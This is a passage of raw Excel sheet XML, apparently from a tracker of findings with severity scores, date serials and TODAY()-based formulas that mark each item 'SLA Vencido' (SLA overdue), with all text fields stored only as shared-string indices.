      </c>
      <c r="AE444" s="51" t="s">
        <v>147</v>
      </c>
      <c r="AG444" s="27" t="s">
        <v>747</v>
      </c>
    </row>
    <row r="445" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A445" s="5">
        <v>444</v>
      </c>
      <c r="B445" s="50" t="s">
        <v>32</v>
      </c>
      <c r="C445" s="50" t="s">
        <v>225</v>
      </c>
      <c r="D445" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G445" s="54" t="s">
        <v>1723</v>
      </c>
      <c r="H445" t="s">
        <v>1729</v>
      </c>
      <c r="J445" t="s">
        <v>556</v>
      </c>
      <c r="L445" s="50" t="s">
        <v>41</v>
      </c>
      <c r="M445" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N445" s="63" t="s">
        <v>1514</v>
      </c>
      <c r="Q445" t="s">
        <v>1725</v>
      </c>
      <c r="T445" s="1">
        <v>45779</v>
      </c>
      <c r="U445" s="55">
        <f t="shared" ca="1" si="18"/>
        <v>430</v>
      </c>
      <c r="V445" s="1">
        <f t="shared" si="23"/>
        <v>45869</v>
      </c>
      <c r="W445" s="56" t="str">
        <f t="shared" ca="1" si="24"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB445" t="s">
        <v>1726</v>
      </c>
      <c r="AC445" t="s">
        <v>1727</v>
      </c>
      <c r="AE445" s="51" t="s">
        <v>147</v>
      </c>
      <c r="AG445" s="27" t="s">
        <v>747</v>
      </c>
    </row>
    <row r="446" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A446" s="5">
        <v>445</v>
      </c>
      <c r="B446" s="50" t="s">
        <v>32</v>
      </c>
      <c r="C446" s="50" t="s">
        <v>225</v>
      </c>
      <c r="D446" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G446" s="54" t="s">
        <v>1723</v>
      </c>
      <c r="H446" t="s">
        <v>1730</v>
      </c>
      <c r="J446" t="s">
        <v>556</v>
      </c>
      <c r="L446" s="50" t="s">
        <v>41</v>
      </c>
      <c r="M446" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N446" s="63" t="s">
        <v>1514</v>
      </c>
      <c r="Q446" t="s">
        <v>1725</v>
      </c>
      <c r="T446" s="1">
        <v>45779</v>
      </c>
      <c r="U446" s="55">
        <f t="shared" ca="1" si="18"/>
        <v>430</v>
      </c>
      <c r="V446" s="1">
        <f t="shared" si="23"/>
        <v>45869</v>
      </c>
      <c r="W446" s="56" t="str">
        <f t="shared" ca="1" si="24"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB446" t="s">
        <v>1726</v>
      </c>
      <c r="AC446" t="s">
        <v>1727</v>
      </c>
      <c r="AE446" s="51" t="s">
        <v>147</v>
      </c>
      <c r="AG446" s="27" t="s">
        <v>747</v>
      </c>
    </row>
    <row r="447" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A447" s="5">
        <v>446</v>
      </c>
      <c r="B447" s="50" t="s">
        <v>32</v>
      </c>
      <c r="C447" s="50" t="s">
        <v>225</v>
      </c>
      <c r="D447" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G447" s="54" t="s">
        <v>1723</v>
      </c>
      <c r="H447" t="s">
        <v>1731</v>
      </c>
      <c r="J447" t="s">
        <v>556</v>
      </c>
      <c r="L447" s="50" t="s">
        <v>41</v>
      </c>
      <c r="M447" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N447" s="63" t="s">
        <v>1514</v>
      </c>
      <c r="Q447" t="s">
        <v>1725</v>
      </c>
      <c r="T447" s="1">
        <v>45779</v>
      </c>
      <c r="U447" s="55">
        <f t="shared" ca="1" si="18"/>
        <v>430</v>
      </c>
      <c r="V447" s="1">
        <f t="shared" si="23"/>
        <v>45869</v>
      </c>
      <c r="W447" s="56" t="str">
        <f t="shared" ca="1" si="24"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB447" t="s">
        <v>1726</v>
      </c>
      <c r="AC447" t="s">
        <v>1727</v>
      </c>
      <c r="AE447" s="51" t="s">
        <v>147</v>
      </c>
      <c r="AG447" s="27" t="s">
        <v>747</v>
      </c>
    </row>
    <row r="448" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A448" s="5">
        <v>447</v>
      </c>
      <c r="B448" s="50" t="s">
        <v>32</v>
      </c>
      <c r="C448" s="50" t="s">
        <v>225</v>
      </c>
      <c r="D448" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G448" s="54" t="s">
        <v>1723</v>
      </c>
      <c r="H448" t="s">
        <v>1732</v>
      </c>
      <c r="J448" t="s">
        <v>560</v>
      </c>
      <c r="L448" s="50" t="s">
        <v>41</v>
      </c>
      <c r="M448" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N448" s="63" t="s">
        <v>1514</v>
      </c>
      <c r="Q448" t="s">
        <v>1725</v>
      </c>
      <c r="T448" s="1">
        <v>45779</v>
      </c>
      <c r="U448" s="55">
        <f t="shared" ca="1" si="18"/>
        <v>430</v>
      </c>
      <c r="V448" s="1">
        <f t="shared" si="23"/>
        <v>45869</v>
      </c>
      <c r="W448" s="56" t="str">
        <f t="shared" ca="1" si="24"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB448" t="s">
        <v>1733</v>
      </c>
      <c r="AC448" t="s">
        <v>1734</v>
      </c>
      <c r="AE448" s="51" t="s">
        <v>147</v>
      </c>
      <c r="AG448" s="27" t="s">
        <v>747</v>
      </c>
    </row>
    <row r="449" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A449" s="5">
        <v>448</v>
      </c>
      <c r="B449" s="50" t="s">
        <v>32</v>
      </c>
      <c r="C449" s="50" t="s">
        <v>225</v>
      </c>
      <c r="D449" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G449" s="54" t="s">
        <v>1723</v>
      </c>
      <c r="H449" t="s">
        <v>1735</v>
      </c>
      <c r="J449" t="s">
        <v>560</v>
      </c>
      <c r="L449" s="50" t="s">
        <v>41</v>
      </c>
      <c r="M449" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N449" s="63" t="s">
        <v>1514</v>
      </c>
      <c r="Q449" t="s">
        <v>1725</v>
      </c>
      <c r="T449" s="1">
        <v>45779</v>
      </c>
      <c r="U449" s="55">
        <f t="shared" ca="1" si="18"/>
        <v>430</v>
      </c>
      <c r="V449" s="1">
        <f t="shared" si="23"/>
        <v>45869</v>
      </c>
      <c r="W449" s="56" t="str">
        <f t="shared" ca="1" si="24"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB449" t="s">
        <v>1733</v>
      </c>
      <c r="AC449" t="s">
        <v>1734</v>
      </c>
      <c r="AE449" s="51" t="s">
        <v>147</v>
      </c>
      <c r="AG449" s="27" t="s">
        <v>747</v>
      </c>
    </row>
    <row r="450" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A450" s="5">
        <v>449</v>
      </c>
      <c r="B450" s="50" t="s">
        <v>32</v>
      </c>
      <c r="C450" s="50" t="s">
        <v>225</v>
      </c>
      <c r="D450" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G450" s="54" t="s">
        <v>1723</v>
      </c>
      <c r="H450" t="s">
        <v>1736</v>
      </c>
      <c r="J450" t="s">
        <v>560</v>
      </c>
      <c r="L450" s="50" t="s">
        <v>41</v>
      </c>
      <c r="M450" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N450" s="63" t="s">
        <v>1514</v>
      </c>
      <c r="Q450" t="s">
        <v>1725</v>
      </c>
      <c r="T450" s="1">
        <v>45779</v>
      </c>
      <c r="U450" s="55">
        <f t="shared" ref="U450:U513" ca="1" si="25">TODAY()-T450</f>
        <v>430</v>
      </c>
      <c r="V450" s="1">
        <f t="shared" si="23"/>
        <v>45869</v>
      </c>
      <c r="W450" s="56" t="str">
        <f t="shared" ca="1" si="24"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB450" t="s">
        <v>1733</v>
      </c>
      <c r="AC450" t="s">
        <v>1734</v>
      </c>
      <c r="AE450" s="51" t="s">
        <v>147</v>
      </c>
      <c r="AG450" s="27" t="s">
        <v>747</v>
      </c>
    </row>
    <row r="451" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A451" s="5">
        <v>450</v>
      </c>
      <c r="B451" s="50" t="s">
        <v>32</v>
      </c>
      <c r="C451" s="50" t="s">
        <v>225</v>
      </c>
      <c r="D451" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G451" s="54" t="s">
        <v>1723</v>
      </c>
      <c r="H451" t="s">
        <v>1737</v>
      </c>
      <c r="J451" t="s">
        <v>560</v>
      </c>
      <c r="L451" s="50" t="s">
        <v>41</v>
      </c>
      <c r="M451" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N451" s="63" t="s">
        <v>1514</v>
      </c>
      <c r="Q451" t="s">
        <v>1725</v>
      </c>
      <c r="T451" s="1">
        <v>45779</v>
      </c>
      <c r="U451" s="55">
        <f t="shared" ca="1" si="25"/>
        <v>430</v>
      </c>
      <c r="V451" s="1">
        <f t="shared" si="23"/>
        <v>45869</v>
      </c>
      <c r="W451" s="56" t="str">
        <f t="shared" ca="1" si="24"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB451" t="s">
        <v>1733</v>
      </c>
      <c r="AC451" t="s">
        <v>1734</v>
      </c>
      <c r="AE451" s="51" t="s">
        <v>147</v>
      </c>
      <c r="AG451" s="27" t="s">
        <v>747</v>
      </c>
    </row>
    <row r="452" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A452" s="5">
        <v>451</v>
      </c>
      <c r="B452" s="50" t="s">
        <v>32</v>
      </c>
      <c r="C452" s="50" t="s">
        <v>225</v>
      </c>
      <c r="D452" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G452" s="54" t="s">
        <v>1723</v>
      </c>
      <c r="H452" t="s">
        <v>1738</v>
      </c>
      <c r="J452" t="s">
        <v>560</v>
      </c>
      <c r="L452" s="50" t="s">
        <v>41</v>
      </c>
      <c r="M452" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N452" s="63" t="s">
        <v>1514</v>
      </c>
      <c r="Q452" t="s">
        <v>1725</v>
      </c>
      <c r="T452" s="1">
        <v>45779</v>
      </c>
      <c r="U452" s="55">
        <f t="shared" ca="1" si="25"/>
        <v>430</v>
      </c>
      <c r="V452" s="1">
        <f t="shared" si="23"/>
        <v>45869</v>
      </c>
      <c r="W452" s="56" t="str">
        <f t="shared" ca="1" si="24"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB452" t="s">
        <v>1733</v>
      </c>
      <c r="AC452" t="s">
        <v>1734</v>
      </c>
      <c r="AE452" s="51" t="s">
        <v>147</v>
      </c>
      <c r="AG452" s="27" t="s">
        <v>747</v>
      </c>
    </row>
    <row r="453" spans="1:33" ht="290" x14ac:dyDescent="0.35">
      <c r="A453" s="5">
        <v>452</v>
      </c>
      <c r="B453" s="50" t="s">
        <v>32</v>
      </c>
      <c r="C453" s="50" t="s">
        <v>225</v>
      </c>
      <c r="D453" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G453" s="54" t="s">
        <v>1539</v>
      </c>
      <c r="I453" t="s">
        <v>1739</v>
      </c>
      <c r="J453" t="s">
        <v>1186</v>
      </c>
      <c r="L453" s="50" t="s">
        <v>41</v>
      </c>
      <c r="M453" s="50" t="s">
        <v>1470</v>
      </c>
      <c r="N453">
        <v>2.8</v>
      </c>
      <c r="Q453" s="65" t="s">
        <v>1740</v>
      </c>
      <c r="T453" s="1">
        <v>45848</v>
      </c>
      <c r="U453" s="55">
        <f t="shared" ca="1" si="25"/>
        <v>361</v>
      </c>
      <c r="V453" s="1">
        <f t="shared" si="23"/>
        <v>45968</v>
      </c>
      <c r="W453" s="56" t="str">
        <f t="shared" ca="1" si="24"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB453" s="65" t="s">
        <v>1741</v>
      </c>
      <c r="AC453" s="65" t="s">
        <v>1742</v>
      </c>
      <c r="AD453" s="65" t="s">
        <v>1743</v>
      </c>
      <c r="AE453" s="65" t="s">
        <v>147</v>
      </c>
      <c r="AG453" s="27" t="s">
        <v>747</v>
      </c>
    </row>
    <row r="454" spans="1:33" ht="290" x14ac:dyDescent="0.35">
      <c r="A454" s="5">
        <v>453</v>
      </c>
      <c r="B454" s="50" t="s">
        <v>32</v>
      </c>
      <c r="C454" s="50" t="s">
        <v>225</v>
      </c>
      <c r="D454" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G454" s="54" t="s">
        <v>1539</v>
      </c>
      <c r="I454" t="s">
        <v>1744</v>
      </c>
      <c r="J454" t="s">
        <v>1186</v>
      </c>
      <c r="L454" s="50" t="s">
        <v>41</v>
      </c>
      <c r="M454" s="50" t="s">
        <v>1470</v>
      </c>
      <c r="N454">
        <v>2.8</v>
      </c>
      <c r="Q454" t="s">
        <v>1745</v>
      </c>
      <c r="T454" s="1">
        <v>45848</v>
      </c>
      <c r="U454" s="55">
        <f t="shared" ca="1" si="25"/>
        <v>361</v>
      </c>
      <c r="V454" s="1">
        <f t="shared" si="23"/>
        <v>45968</v>
      </c>
      <c r="W454" s="56" t="str">
        <f t="shared" ca="1" si="24"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB454" s="65" t="s">
        <v>1741</v>
      </c>
      <c r="AC454" s="65" t="s">
        <v>1742</v>
      </c>
      <c r="AD454" s="65" t="s">
        <v>1743</v>
      </c>
      <c r="AE454" s="65" t="s">
        <v>147</v>
      </c>
      <c r="AG454" s="27" t="s">
        <v>747</v>
      </c>
    </row>
    <row r="455" spans="1:33" ht="203" x14ac:dyDescent="0.35">
      <c r="A455" s="5">
        <v>454</v>
      </c>
      <c r="B455" s="50" t="s">
        <v>32</v>
      </c>
      <c r="C455" s="50" t="s">
        <v>225</v>
      </c>
      <c r="D455" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G455" s="54" t="s">
        <v>1539</v>
      </c>
      <c r="I455" t="s">
        <v>1746</v>
      </c>
      <c r="J455" t="s">
        <v>1747</v>
      </c>
      <c r="L455" s="50" t="s">
        <v>41</v>
      </c>
      <c r="M455" s="50" t="s">
        <v>1470</v>
      </c>
      <c r="N455">
        <v>2.8</v>
      </c>
      <c r="Q455" t="s">
        <v>1745</v>
      </c>
      <c r="T455" s="1">
        <v>45848</v>
      </c>
      <c r="U455" s="55">
        <f t="shared" ca="1" si="25"/>
        <v>361</v>
      </c>
      <c r="V455" s="1">
        <f t="shared" si="23"/>
        <v>45968</v>
      </c>
      <c r="W455" s="56" t="str">
        <f t="shared" ca="1" si="24"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB455" s="65" t="s">
        <v>1748</v>
      </c>
      <c r="AC455" s="65" t="s">
        <v>1749</v>
      </c>
      <c r="AD455" s="65" t="s">
        <v>1750</v>
      </c>
      <c r="AE455" s="68" t="s">
        <v>147</v>
      </c>
      <c r="AG455" s="27" t="s">
        <v>747</v>
      </c>
    </row>
    <row r="456" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A456" s="5">
        <v>455</v>
      </c>
      <c r="B456" s="50" t="s">
        <v>32</v>
      </c>
      <c r="C456" s="50" t="s">
        <v>225</v>
      </c>
      <c r="D456" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G456" s="54" t="s">
        <v>1323</v>
      </c>
      <c r="H456" t="s">
        <v>1751</v>
      </c>
      <c r="J456" t="s">
        <v>971</v>
      </c>
      <c r="L456" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M456" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N456">
        <v>5.3</v>
      </c>
      <c r="Q456" t="s">
        <v>1752</v>
      </c>
      <c r="T456" s="1">
        <v>45850</v>
      </c>
      <c r="U456" s="55">
        <f t="shared" ca="1" si="25"/>
        <v>359</v>
      </c>
      <c r="V456" s="1">
        <f t="shared" si="23"/>
        <v>45940</v>
      </c>
      <c r="W456" s="56" t="str">
        <f t="shared" ca="1" si="24"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB456" t="s">
        <v>1753</v>
      </c>
      <c r="AC456" t="s">
        <v>1754</v>
      </c>
      <c r="AE456" s="68" t="s">
        <v>147</v>
      </c>
      <c r="AG456" s="51" t="s">
        <v>969</v>
      </c>
    </row>
    <row r="457" spans="1:33" ht="87" x14ac:dyDescent="0.35">
      <c r="A457" s="5">
        <v>456</v>
      </c>
      <c r="B457" t="s">
        <v>32</v>
      </c>
      <c r="C457" t="s">
        <v>33</v>
      </c>
      <c r="D457" t="s">
        <v>34</v>
      </c>
      <c r="G457" s="6" t="s">
        <v>1309</v>
      </c>
      <c r="H457" t="s">
        <v>1755</v>
      </c>
      <c r="J457" t="s">
        <v>80</v>
      </c>
      <c r="L457" t="s">
        <v>655</v>
      </c>
      <c r="M457" t="s">
        <v>61</v>
      </c>
      <c r="N457">
        <v>4.4000000000000004</v>
      </c>
      <c r="Q457" t="s">
        <v>1756</v>
      </c>
      <c r="T457" s="1">
        <v>45852</v>
      </c>
      <c r="U457" s="11">
        <f t="shared" ca="1" si="25"/>
        <v>357</v>
      </c>
      <c r="V457" s="8">
        <f t="shared" si="23"/>
        <v>45942</v>
      </c>
      <c r="W457" s="12" t="str">
        <f t="shared" ca="1" si="24"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB457" s="65" t="s">
        <v>1757</v>
      </c>
      <c r="AC457" s="65" t="s">
        <v>1758</v>
      </c>
      <c r="AD457" s="65" t="s">
        <v>1759</v>
      </c>
      <c r="AE457" s="65" t="s">
        <v>147</v>
      </c>
      <c r="AG457" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="458" spans="1:33" ht="87" x14ac:dyDescent="0.35">
      <c r="A458" s="5">
        <v>457</v>
      </c>
      <c r="B458" t="s">
        <v>32</v>
      </c>
      <c r="C458" t="s">
        <v>33</v>
      </c>
      <c r="D458" t="s">
        <v>34</v>
      </c>
      <c r="G458" s="6" t="s">
        <v>1309</v>
      </c>
      <c r="J458" t="s">
        <v>1760</v>
      </c>
      <c r="L458" t="s">
        <v>655</v>
      </c>
      <c r="M458" t="s">
        <v>1470</v>
      </c>
      <c r="N458">
        <v>3</v>
      </c>
      <c r="Q458" t="s">
        <v>1756</v>
      </c>
      <c r="T458" s="1">
        <v>45852</v>
      </c>
      <c r="U458" s="11">
        <f t="shared" ca="1" si="25"/>
        <v>357</v>
      </c>
      <c r="V458" s="8">
        <f t="shared" si="23"/>
        <v>45972</v>
      </c>
      <c r="W458" s="12" t="str">
        <f t="shared" ca="1" si="24"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB458" s="65" t="s">
        <v>1761</v>
      </c>
      <c r="AC458" s="65" t="s">
        <v>1762</v>
      </c>
      <c r="AD458" s="65" t="s">
        <v>1763</v>
      </c>
      <c r="AE458" s="65" t="s">
        <v>147</v>
      </c>
      <c r="AG458" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="459" spans="1:33" ht="232" x14ac:dyDescent="0.35">
      <c r="A459" s="5">
        <v>458</v>
      </c>
      <c r="B459" t="s">
        <v>32</v>
      </c>
      <c r="C459" t="s">
        <v>33</v>
      </c>
      <c r="D459" t="s">
        <v>34</v>
      </c>
      <c r="G459" s="6" t="s">
        <v>1309</v>
      </c>
      <c r="J459" t="s">
        <v>1764</v>
      </c>
      <c r="L459" t="s">
        <v>655</v>
      </c>
      <c r="M459" t="s">
        <v>1470</v>
      </c>
      <c r="N459">
        <v>2.8</v>
      </c>
      <c r="Q459" t="s">
        <v>1756</v>
      </c>
      <c r="T459" s="1">
        <v>45852</v>
      </c>
      <c r="U459" s="11">
        <f t="shared" ca="1" si="25"/>
        <v>357</v>
      </c>
      <c r="V459" s="8">
        <f t="shared" si="23"/>
        <v>45972</v>
      </c>
      <c r="W459" s="12" t="str">
        <f t="shared" ca="1" si="24"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB459" s="65" t="s">
        <v>1765</v>
      </c>
      <c r="AC459" s="65" t="s">
        <v>1766</v>
      </c>
      <c r="AD459" s="65" t="s">
        <v>1767</v>
      </c>
      <c r="AE459" s="65" t="s">
        <v>147</v>
      </c>
      <c r="AG459" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="460" spans="1:33" ht="130.5" x14ac:dyDescent="0.35">
      <c r="A460" s="5">
        <v>459</v>
      </c>
      <c r="B460" t="s">
        <v>32</v>
      </c>
      <c r="C460" t="s">
        <v>33</v>
      </c>
      <c r="D460" t="s">
        <v>34</v>
      </c>
      <c r="G460" s="6" t="s">
        <v>1309</v>
      </c>
      <c r="J460" t="s">
        <v>1233</v>
      </c>
      <c r="L460" t="s">
        <v>655</v>
      </c>
      <c r="M460" t="s">
        <v>1470</v>
      </c>
      <c r="N460">
        <v>2.8</v>
      </c>
      <c r="Q460" t="s">
        <v>1756</v>
      </c>
      <c r="T460" s="1">
        <v>45852</v>
      </c>
      <c r="U460" s="11">
        <f t="shared" ca="1" si="25"/>
        <v>357</v>
      </c>
      <c r="V460" s="8">
        <f t="shared" si="23"/>
        <v>45972</v>
      </c>
      <c r="W460" s="12" t="str">
        <f t="shared" ca="1" si="24"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB460" s="65" t="s">
        <v>1768</v>
      </c>
      <c r="AC460" s="65" t="s">
        <v>1769</v>
      </c>
      <c r="AD460" s="65" t="s">
        <v>1770</v>
      </c>
      <c r="AE460" s="65" t="s">
        <v>147</v>
      </c>
      <c r="AG460" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="461" spans="1:33" ht="16.5" x14ac:dyDescent="0.45">
      <c r="A461" s="5">
        <v>460</v>
      </c>
      <c r="B461" t="s">
        <v>32</v>
      </c>
      <c r="C461" t="s">
        <v>225</v>
      </c>
      <c r="D461" t="s">
        <v>34</v>
      </c>
      <c r="G461" s="6" t="s">
        <v>1309</v>
      </c>
      <c r="H461" t="s">
        <v>1771</v>
      </c>
      <c r="J461" t="s">
        <v>556</v>
      </c>
      <c r="L461" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M461" t="s">
        <v>61</v>
      </c>
      <c r="N461">
        <v>4.0999999999999996</v>
      </c>
      <c r="Q461" t="s">
        <v>1772</v>
      </c>
      <c r="T461" s="1">
        <v>45857</v>
      </c>
      <c r="U461" s="55">
        <f t="shared" ca="1" si="25"/>
        <v>352</v>
      </c>
      <c r="V461" s="1">
        <f t="shared" si="23"/>
        <v>45947</v>
      </c>
      <c r="W461" s="56" t="str">
        <f t="shared" ca="1" si="24"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB461" s="69" t="s">
        <v>1542</v>
      </c>
      <c r="AC461" s="65" t="s">
        <v>1773</v>
      </c>
      <c r="AE461" s="65" t="s">
        <v>147</v>
      </c>
      <c r="AG461" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="462" spans="1:33" ht="16.5" x14ac:dyDescent="0.45">
      <c r="A462" s="5">
        <v>461</v>
      </c>
      <c r="B462" t="s">
        <v>32</v>
      </c>
      <c r="C462" t="s">
        <v>225</v>
      </c>
      <c r="D462" t="s">
        <v>34</v>
      </c>
      <c r="G462" s="6" t="s">
        <v>1309</v>
      </c>
      <c r="H462" t="s">
        <v>1774</v>
      </c>
      <c r="J462" t="s">
        <v>556</v>
      </c>
      <c r="L462" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M462" t="s">
        <v>61</v>
      </c>
      <c r="N462">
        <v>4.0999999999999996</v>
      </c>
      <c r="Q462" t="s">
        <v>1772</v>
      </c>
      <c r="T462" s="1">
        <v>45857</v>
      </c>
      <c r="U462" s="55">
        <f t="shared" ca="1" si="25"/>
        <v>352</v>
      </c>
      <c r="V462" s="1">
        <f t="shared" si="23"/>
        <v>45947</v>
      </c>
      <c r="W462" s="56" t="str">
        <f t="shared" ca="1" si="24"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB462" s="69" t="s">
        <v>1542</v>
      </c>
      <c r="AC462" s="65" t="s">
        <v>1773</v>
      </c>
      <c r="AE462" s="65" t="s">
        <v>147</v>
      </c>
      <c r="AG462" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="463" spans="1:33" ht="16.5" x14ac:dyDescent="0.45">
      <c r="A463" s="5">
        <v>462</v>
      </c>
      <c r="B463" t="s">
        <v>32</v>
      </c>
      <c r="C463" t="s">
        <v>225</v>
      </c>
      <c r="D463" t="s">
        <v>34</v>
      </c>
      <c r="G463" s="6" t="s">
        <v>1309</v>
      </c>
      <c r="H463" t="s">
        <v>1775</v>
      </c>
      <c r="J463" t="s">
        <v>556</v>
      </c>
      <c r="L463" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M463" t="s">
        <v>61</v>
      </c>
      <c r="N463">
        <v>4.0999999999999996</v>
      </c>
      <c r="Q463" t="s">
        <v>1772</v>
      </c>
      <c r="T463" s="1">
        <v>45857</v>
      </c>
      <c r="U463" s="55">
        <f t="shared" ca="1" si="25"/>
        <v>352</v>
      </c>
      <c r="V463" s="1">
        <f t="shared" si="23"/>
        <v>45947</v>
      </c>
      <c r="W463" s="56" t="str">
        <f t="shared" ca="1" si="24"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB463" s="69" t="s">
        <v>1542</v>
      </c>
      <c r="AC463" s="65" t="s">
        <v>1773</v>
      </c>
      <c r="AE463" s="65" t="s">
        <v>147</v>
      </c>
      <c r="AG463" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="464" spans="1:33" ht="16.5" x14ac:dyDescent="0.45">
      <c r="A464" s="5">
        <v>463</v>
      </c>
      <c r="B464" t="s">
        <v>32</v>
      </c>
      <c r="C464" t="s">
        <v>225</v>
      </c>
      <c r="D464" t="s">
        <v>34</v>
      </c>
      <c r="G464" s="6" t="s">
        <v>1309</v>
      </c>
      <c r="H464" t="s">
        <v>1776</v>
      </c>
      <c r="J464" t="s">
        <v>556</v>
      </c>
      <c r="L464" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M464" t="s">
        <v>61</v>
      </c>
      <c r="N464">
        <v>4.0999999999999996</v>
      </c>
      <c r="Q464" t="s">
        <v>1772</v>
      </c>
      <c r="T464" s="1">
        <v>45857</v>
      </c>
      <c r="U464" s="55">
        <f t="shared" ca="1" si="25"/>
        <v>352</v>
      </c>
      <c r="V464" s="1">
        <f t="shared" si="23"/>
        <v>45947</v>
      </c>
      <c r="W464" s="56" t="str">
        <f t="shared" ca="1" si="24"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB464" s="69" t="s">
        <v>1542</v>
      </c>
      <c r="AC464" s="65" t="s">
        <v>1773</v>
      </c>
      <c r="AE464" s="65" t="s">
        <v>147</v>
      </c>
      <c r="AG464" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="465" spans="1:33" ht="16.5" x14ac:dyDescent="0.45">
      <c r="A465" s="5">
        <v>464</v>
      </c>
      <c r="B465" t="s">
        <v>32</v>
      </c>
      <c r="C465" t="s">
        <v>225</v>
      </c>
      <c r="D465" t="s">
        <v>34</v>
      </c>
      <c r="G465" s="6" t="s">
        <v>1309</v>
      </c>
      <c r="H465" t="s">
        <v>1777</v>
      </c>
      <c r="J465" t="s">
        <v>556</v>
      </c>
      <c r="L465" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M465" t="s">
        <v>61</v>
      </c>
      <c r="N465">
        <v>4.0999999999999996</v>
      </c>
      <c r="Q465" t="s">
        <v>1772</v>
      </c>
      <c r="T465" s="1">
        <v>45857</v>
      </c>
      <c r="U465" s="55">
        <f t="shared" ca="1" si="25"/>
        <v>352</v>
      </c>
      <c r="V465" s="1">
        <f t="shared" si="23"/>
        <v>45947</v>
      </c>
      <c r="W465" s="56" t="str">
        <f t="shared" ca="1" si="24"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB465" s="69" t="s">
        <v>1542</v>
      </c>
      <c r="AC465" s="65" t="s">
        <v>1773</v>
      </c>
      <c r="AE465" s="65" t="s">
        <v>147</v>
      </c>
      <c r="AG465" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="466" spans="1:33" ht="16.5" x14ac:dyDescent="0.45">
      <c r="A466" s="5">
        <v>465</v>
      </c>
      <c r="B466" t="s">
        <v>32</v>
      </c>
      <c r="C466" t="s">
        <v>225</v>
      </c>
      <c r="D466" t="s">
        <v>34</v>
      </c>
      <c r="G466" s="6" t="s">
        <v>1309</v>
      </c>
      <c r="H466" t="s">
        <v>1778</v>
      </c>
      <c r="J466" t="s">
        <v>556</v>
      </c>
      <c r="L466" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M466" t="s">
        <v>61</v>
      </c>
      <c r="N466">
        <v>4.0999999999999996</v>
      </c>
      <c r="Q466" t="s">
        <v>1772</v>
      </c>
      <c r="T466" s="1">
        <v>45857</v>
      </c>
      <c r="U466" s="55">
        <f t="shared" ca="1" si="25"/>
        <v>352</v>
      </c>
      <c r="V466" s="1">
        <f t="shared" si="23"/>
        <v>45947</v>
      </c>
      <c r="W466" s="56" t="str">
        <f t="shared" ca="1" si="24"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB466" s="69" t="s">
        <v>1542</v>
      </c>
      <c r="AC466" s="65" t="s">
        <v>1773</v>
      </c>
      <c r="AE466" s="65" t="s">
        <v>147</v>
      </c>
      <c r="AG466" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="467" spans="1:33" ht="16.5" x14ac:dyDescent="0.45">
      <c r="A467" s="5">
        <v>466</v>
      </c>
      <c r="B467" t="s">
        <v>32</v>
      </c>
      <c r="C467" t="s">
        <v>225</v>
      </c>
      <c r="D467" t="s">
        <v>34</v>
      </c>
      <c r="G467" s="6" t="s">
        <v>1309</v>
      </c>
      <c r="H467" t="s">
        <v>1779</v>
      </c>
      <c r="J467" t="s">
        <v>556</v>
      </c>
